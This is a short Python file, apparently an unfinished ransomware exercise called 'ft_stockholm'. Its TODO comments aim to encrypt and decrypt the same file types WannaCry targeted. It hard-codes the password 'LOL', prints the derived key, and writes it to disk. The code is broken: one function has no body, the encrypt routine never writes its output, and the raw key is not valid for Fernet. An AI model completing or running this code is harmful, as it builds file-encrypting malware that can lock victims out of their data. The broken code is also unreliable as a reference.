#!/usr/bin/env python3

# TODO: encrypt
# TODO: decrypt
# TODO: Target all the file targeted by wannacry

import argparse
import os

from cryptography.fernet import Fernet
from cryptography.hazmat.primitives.kdf.argon2 import Argon2id

def kdf():
    salt = os.urandom(16)
    kdf = Argon2id(
        salt=salt,
        length=32,
        iterations=1,
        lanes=4,
        memory_cost= 64 * 1024,
        ad=None,
        secret=None
    )
    key = kdf.derive(b"LOL")
    print(key)
    with open('ft_stockholm.key','wb') as file:
        file.write(key)
    kdf = Argon2id(
        salt=salt,
        length=32,
        iterations=1,
        lanes=4,
        memory_cost= 64 * 1024,
        ad=None,
        secret=None
    )
    kdf.verify(b"LOL",key)

def verify_key(path_to_key: str):




    

def get_content_file(path_to_file: str) -> bytes:
    content = None
    with open(path_to_file, 'rb') as file:
        content = file.read()
        file.close()
    return content

def encrypt(path_to_file: str, key: bytes):
    try:
        f = Fernet(key)
        f.encrypt(get_content_file(path_to_file))
    except Exception as e:
        print(f"Failed for {e}")
    


def main():
    # parser = argparse.ArgumentParser()
    # parser.add_argument("-g","--hex-key",help="The path of the key file, must be at least 64 character in hexadecimal")
    # parser.add_argument("-k","--gen-password",action="store_true",help="generate a new temporary password")
    # args = parser.parse_args()
    # encrypt("Makefile_to_c",b"LOLOLOLOLOLOLOLOL")
    kdf()



if __name__ == "__main__":
    main()
